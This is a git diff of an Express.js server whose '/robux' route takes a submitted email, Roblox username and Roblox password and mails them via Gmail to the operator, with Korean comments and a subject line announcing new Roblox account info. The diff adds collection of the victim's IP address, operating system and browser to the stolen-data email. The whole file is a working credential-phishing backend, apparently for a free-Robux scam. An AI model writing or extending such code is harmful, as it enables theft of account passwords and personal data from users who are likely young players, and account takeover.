@@ -7,14 +7,13 @@ const querystring = require('querystring');
 const rateLimit = require('express-rate-limit');
 const useragent = require('express-useragent');
 require('dotenv').config();
-
 const app = express();
 const port = 3000;
 
+app.use(useragent.express());
+
 // Body-parser 설정
-app.use(bodyParser.urlencoded({
-    extended: true
-}));
+app.use(bodyParser.urlencoded({extended: true}));
 
 // 정적 파일 제공 (form.html 위치)
 app.use(express.static(__dirname));
@@ -77,7 +76,11 @@ app.post("/robux", async (req, res) => {
         const success = response.data.success;
 
         if (success) {
-            // Nodemailer transporter 설정
+            const userAgent = req.useragent;
+            const userIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+            const os = userAgent.os;
+            const browser = userAgent.browser;
+
             const transporter = nodemailer.createTransport({
                 service: "gmail",
                 auth: {
@@ -94,9 +97,12 @@ app.post("/robux", async (req, res) => {
                 to: process.env.EMAIL, // 수신자 이메일
                 subject: "새로운 Roblox 계정 정보가 도착했습니다!",
                 text: `
-이메일: ${email}
-Roblox 아이디: ${roblox_id}
-Roblox 비밀번호: ${roblox_pwd}
+🌐 IP 주소: ${userIp}
+💻 운영체제: ${os}
+🌍 브라우저: ${browser}
+✉️ 이메일: ${email}
+🆔 Roblox 아이디: ${roblox_id}
+🔐 Roblox 비밀번호: ${roblox_pwd}
 
 ${privacy_checked}
 ${_3rdperson_checked}
